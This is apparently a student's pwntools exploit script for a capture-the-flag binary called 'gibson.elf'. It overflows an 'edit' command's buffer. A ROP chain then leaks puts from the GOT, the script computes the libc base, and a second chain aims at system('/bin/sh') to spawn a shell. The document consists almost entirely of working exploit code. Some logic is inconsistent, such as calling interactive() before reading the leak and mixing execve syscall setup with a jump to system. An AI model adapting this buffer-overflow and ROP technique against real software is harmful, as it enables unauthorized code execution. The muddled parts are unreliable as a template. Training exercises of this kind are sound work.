from pwn import *
import re

context.log_level='debug' # 'CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARNING'
context.arch='amd64'
context.binary='./gibson.elf'
# context.terminal=['tmux', 'splitw']
p=process('./gibson.elf')#,env={"LD_PRELOAD": "./libc-2.23.so"}) # to run locally with the libc provided
# p=remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1343) # to run remotely
# p.sendafter(b'abc123):', b'amb10162\n') # to run remotely

e = ELF("./gibson.elf")
r = ROP(e)
# gdb.attach(p, 'break *main+126') # to run locally

get_base_send = [
    # pop rdi; ret
    0x00401ab3, e.got['puts'],
    e.plt['puts'],
    # goes back to main
    0x00401824
]

# cd could be a target because of strchr()
# ln could be a target because of dir_find_child and add_dir_child. Let's find out more
#   it seems that the add_dir_child could be vulnerable at the file to be pointed at (has to exist first)
# touch seems to be vulnerable
# edit is vulnerable. fgets after the "OK, send up %d bytes of data:" can be overflown

# let's create the file to be overflown
p.sendafter('exit', b'touch\n')
p.sendafter('touch what?',b'1337\n')
p.sendafter('how much data do you want to put in it?',b'5\n')
p.sendafter('bytes of data to put in file:',b'A'*6 + b'\n')

# the file is created. now let's edit and have infinite buffer space
p.sendafter('Command not recognized!',b'edit\n')
p.sendafter('edit what?',b'1337\n')
# this could be the point where we attack, or we still need to put +1 byte and then edit one last time
pause()
p.sendafter('bytes of data:',b'A'*4 + b''.join(map(p64, get_base_send)) + b'\n')
p.interactive()

get_base_return = p.recvuntil('Gibson')
print('Return: ', get_base_return[0:8])
get_base_short = get_base_return[1:7] + b'\x00\x00'
get_base_final = u64(get_base_short)
print(hex(get_base_final))

# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.23.so")
libcROP = ROP(libc)
libcBase = get_base_final - libc.symbols['puts']
print("Offset to be applied: ", hex(libcBase))
pause()


bin_sh = next(libc.search(b'/bin/sh\x00'))
print("/bin/sh: ", hex(bin_sh + libcBase))
execve = libc.symbols['system']
print("system: ", hex(execve + libcBase))

print("pop rdi: ", libcROP.find_gadget(['pop rdi', 'ret']))
print("pop rsi: ", libcROP.find_gadget(['pop rsi', 'ret']))
print("pop rdx: ", libcROP.find_gadget(['pop rdx', 'ret']))
print("pop rax: ", libcROP.find_gadget(['pop rax', 'ret']))


overflow = b'A'*0x28

payload = [
    libcROP.find_gadget(['pop rdi', 'ret']).address + libcBase,
    # /bin/sh
    bin_sh + libcBase,
    libcROP.find_gadget(['pop rsi', 'ret']).address + libcBase,
    0x0,
    libcROP.find_gadget(['pop rdx', 'ret']).address + libcBase,
    0x0,
    libcROP.find_gadget(['pop rax', 'ret']).address + libcBase,
    # execve
    0x3b,
    # syscall
    libc.symbols['system'] + libcBase,
]
p.sendafter(b'tools..', overflow + b''.join(map(p64,payload)) + b'\n')
